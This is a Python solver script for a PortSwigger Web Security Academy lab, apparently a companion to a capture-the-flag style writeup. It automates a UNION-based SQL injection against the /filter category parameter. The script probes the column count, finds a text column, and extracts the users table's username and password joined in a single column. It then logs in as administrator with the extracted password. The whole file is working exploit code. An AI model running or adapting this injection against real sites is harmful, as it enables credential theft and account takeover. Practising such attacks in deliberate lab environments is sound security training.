#!/usr/bin/env python3
"""
SQL injection UNION attack, retrieving multiple values in a single column
PortSwigger Web Security Academy -- SQL Injection

Companion script for the writeup: 10-union-multiple-values-single-column.md

What this does:
    With only one text-bearing column available, concatenates username and
    password together with a `~` separator so both values can travel through
    that single column, then splits them back apart and logs in as
    administrator.

Usage:
    python 10-union-multiple-values-single-column.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

MAX_COLS = 10


def detect_union_cols(client: httpx.Client, url: str) -> tuple[int, int]:
    column_count = 0
    for n in range(1, MAX_COLS + 1):
        nulls = ",".join(["NULL"] * n)
        r = client.get(f"{url}/filter", params={"category": f"Gifts' UNION SELECT {nulls}-- "})
        if r.status_code == 200 and "error" not in r.text.lower()[:200]:
            column_count = n
            break
    if not column_count:
        raise RuntimeError("Could not determine column count")

    probe = "SQLI_COL_PROBE"
    string_col_index = 0
    for i in range(column_count):
        parts = ["NULL"] * column_count
        parts[i] = f"'{probe}'"
        r = client.get(f"{url}/filter", params={"category": f"Gifts' UNION SELECT {','.join(parts)}-- "})
        if probe in r.text:
            string_col_index = i
            break
    return column_count, string_col_index


def get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    column_count, string_col_index = detect_union_cols(client, lab_url)
    print(f"[+] Columns: {column_count}, text column index: {string_col_index}")

    parts = ["NULL"] * column_count
    parts[string_col_index] = "username||'~'||password FROM users"
    payload = f"Gifts' UNION SELECT {','.join(parts)}-- "
    r = client.get(f"{lab_url}/filter", params={"category": payload})

    m = re.search(r'administrator~([a-zA-Z0-9]+)', r.text)
    if not m:
        print("[-] Could not find administrator's concatenated row in the response.")
        return
    admin_pass = m.group(1)
    print(f"[+] administrator's password: {admin_pass}")

    csrf = get_csrf(client, f"{lab_url}/login")
    login = client.post(f"{lab_url}/login", data={"username": "administrator", "password": admin_pass, "csrf": csrf})
    if "Log out" in login.text or "/my-account" in str(login.url):
        print("[+] Logged in as administrator. Lab solved.")
    else:
        print("[-] Login did not succeed with the extracted password.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
